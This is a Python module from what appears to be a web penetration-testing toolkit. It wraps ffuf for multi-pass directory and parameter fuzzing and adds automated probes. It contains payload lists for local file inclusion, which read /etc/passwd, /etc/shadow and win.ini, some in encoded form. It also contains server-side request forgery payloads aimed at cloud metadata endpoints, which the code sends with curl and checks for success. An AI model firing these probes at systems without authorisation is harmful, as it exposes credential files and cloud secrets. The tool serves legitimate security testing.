"""
Smart directory/parameter fuzzer wrapping ffuf.

Features beyond plain ffuf:
  - Auto-selects wordlist based on detected CMS
  - Runs multiple passes: dirs → files → params → LFI/SSRF probes
  - Filters noise automatically (same-size 404s, redirects to login)
  - LFI quick-check on discovered endpoints
  - SSRF probe on form params
"""

import os
from typing import AsyncGenerator
from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Smart Fuzzer (ffuf)",
    description=(
        "Multi-pass fuzzer: directories → files → parameters → LFI/SSRF probes. "
        "Auto-selects wordlist per CMS. Filters noise. "
        "Chains discoveries into further scans automatically."
    ),
    usage="Provide base URL. CMS hint optional (auto-detected if fingerprinter ran first).",
    danger_note="🟠 Medium Risk — sends many HTTP requests. Do not use on production systems without permission.",
    example="ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt",
)

DANGER = DangerLevel.ORANGE

WORDLISTS = {
    "default":   "/usr/share/wordlists/dirb/common.txt",
    "big":       "/usr/share/wordlists/dirb/big.txt",
    "wordpress": "/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt",
    "joomla":    "/usr/share/seclists/Discovery/Web-Content/CMS/joomla.fuzz.txt",
    "api":       "/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",
    "params":    "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
}

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",   # AWS metadata
    "http://metadata.google.internal/",             # GCP
    "http://localhost/",
    "http://127.0.0.1:22/",
]


class SmartFuzzer:
    def __init__(self, threads: int = 40):
        self.threads = threads
        self._runner = CommandRunner()

    async def fuzz_dirs(
        self,
        url: str,
        wordlist: str = "",
        extensions: str = "php,html,txt,js,json,bak",
        filter_size: str = "",
    ) -> AsyncGenerator[str, None]:
        wl = wordlist or WORDLISTS["default"]
        yield f"[*] Directory fuzzing: {url}"
        yield f"[*] Wordlist: {os.path.basename(wl)}"

        cmd = [
            "ffuf",
            "-u", f"{url.rstrip('/')}/FUZZ",
            "-w", wl,
            "-e", f".{extensions.replace(',', ',.')}",
            "-t", str(self.threads),
            "-mc", "200,201,204,301,302,307,401,403",
            "-ic",
            "-c",
        ]
        if filter_size:
            cmd += ["-fs", filter_size]

        found = []
        async for line in self._runner.run(cmd):
            if "[" in line and "Status:" in line:
                found.append(line)
                yield f"[+] {line.strip()}"
            elif line.strip() and not line.startswith("::"):
                yield line

        yield f"\n[+] Found {len(found)} results"

    async def fuzz_params(
        self,
        url: str,
        method: str = "GET",
    ) -> AsyncGenerator[str, None]:
        wl = WORDLISTS["params"]
        if not os.path.exists(wl):
            yield f"[!] Param wordlist not found: {wl}"
            yield "[*] Install: apt install seclists"
            return

        yield f"[*] Parameter fuzzing ({method}): {url}"
        fuzz_url = f"{url}?FUZZ=testval" if method == "GET" else url
        cmd = [
            "ffuf",
            "-u", fuzz_url,
            "-w", wl,
            "-t", str(self.threads),
            "-mc", "200,201,204",
            "-ic", "-c",
        ]
        if method == "POST":
            cmd += ["-X", "POST", "-d", "FUZZ=testval", "-H", "Content-Type: application/x-www-form-urlencoded"]

        async for line in self._runner.run(cmd):
            if "[" in line and "Status:" in line:
                yield f"[+] Param found: {line.strip()}"
            elif line.strip():
                yield line

    async def lfi_probe(self, url: str, param: str = "file") -> AsyncGenerator[str, None]:
        yield f"[*] LFI probe on {url}?{param}=..."
        for payload in LFI_PAYLOADS:
            r = CommandRunner()
            found = False
            async for line in r.run([
                "curl", "-s", "--max-time", "5",
                f"{url}?{param}={payload}",
            ]):
                if "root:" in line or "[extensions]" in line:  # /etc/passwd or win.ini
                    yield f"[+] LFI CONFIRMED! payload={payload}"
                    yield f"    {line.strip()}"
                    found = True
            if not found:
                yield f"    [-] {payload[:40]}..."

    async def ssrf_probe(self, url: str, param: str = "url") -> AsyncGenerator[str, None]:
        yield f"[*] SSRF probe on {url}?{param}=..."
        for payload in SSRF_PAYLOADS:
            r = CommandRunner()
            async for line in r.run([
                "curl", "-s", "--max-time", "5",
                f"{url}?{param}={payload}",
            ]):
                if "ami-id" in line or "instance-id" in line or "metadata" in line.lower():
                    yield f"[+] SSRF CONFIRMED → Cloud metadata accessible!"
                    yield f"    Payload: {payload}"
                    yield f"    Response: {line.strip()[:200]}"
                    return

        yield "[-] No obvious SSRF found with basic payloads"

    async def stop(self):
        await self._runner.stop()
